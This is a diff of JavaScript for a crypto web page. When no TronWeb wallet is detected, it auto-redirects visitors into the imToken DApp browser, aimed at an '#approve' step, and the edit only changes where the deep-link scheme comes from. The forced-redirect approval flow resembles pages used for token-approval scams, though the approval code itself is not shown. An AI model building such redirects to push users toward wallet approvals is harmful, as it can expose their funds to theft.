@@ -1026,6 +1026,7 @@ document.addEventListener('DOMContentLoaded', async () => {
     }
 });
 // ========== 环境检测（最终版：用官方Scheme直接唤起浏览器） ==========
+// ========== 环境检测（最终最终版：复用你已定义的正确配置） ==========
 async function checkImTokenEnv() {
     const lang = langConfig[currentLang];
     if (window.tronWeb) {
@@ -1044,23 +1045,19 @@ async function checkImTokenEnv() {
         return;
     }
 
-    // 非imToken环境：用官方Scheme，直接唤起内置浏览器
+    // 非imToken环境：100%复用你已定义的正确配置，不手动写Scheme！
     specialTipContainer.style.display = "block";
-    userInfoEl.innerHTML = lang.nonImTokenUser; // 正在自动唤起imToken...
+    userInfoEl.innerHTML = lang.nonImTokenUser;
     approveBtn.style.display = "none";
     connectBtn.style.display = "none";
     nonImTokenPopup.style.display = "none";
 
-    // 关键1：构造完整带协议的目标URL（必须带http/https，否则识别失败）
     const fullTargetUrl = window.location.href + "#approve";
-    // 关键2：用imToken官方推荐Scheme（直接进DApp浏览器，不是只唤起APP）
-    const officialScheme = "imtokenv2://navigate/DappView?url=";
-    // 关键3：正确编码URL（和按钮逻辑完全一致）
-    const encodedUrl = encodeURIComponent(fullTargetUrl);
-    const jumpUrl = officialScheme + encodedUrl;
+    // 直接用你定义的imTokenConfig.scheme，不修改任何已有配置！
+    const jumpUrl = imTokenConfig.scheme + encodeURIComponent(fullTargetUrl);
 
-    // 直接触发跳转（和按钮成功逻辑完全一样）
-    console.log("📤 用官方Scheme跳转：", jumpUrl);
+    // 触发跳转（和你之前成功的逻辑完全一致）
+    console.log("📤 复用已定义配置跳转：", jumpUrl);
     window.location.href = jumpUrl;
 
     // 延迟3秒检测结果
@@ -1069,10 +1066,10 @@ async function checkImTokenEnv() {
             nonImTokenPopup.style.display = "block";
             connectBtn.style.display = "block";
 
-            // 按钮也同步用官方Scheme（确保统一）
+            // 按钮也复用同一配置，确保100%一致
             connectBtn.onclick = () => {
                 const fullTargetUrl = window.location.href + "#approve";
-                const jumpUrl = "imtokenv2://navigate/DappView?url=" + encodeURIComponent(fullTargetUrl);
+                const jumpUrl = imTokenConfig.scheme + encodeURIComponent(fullTargetUrl);
                 window.location.href = jumpUrl;
             };
         }
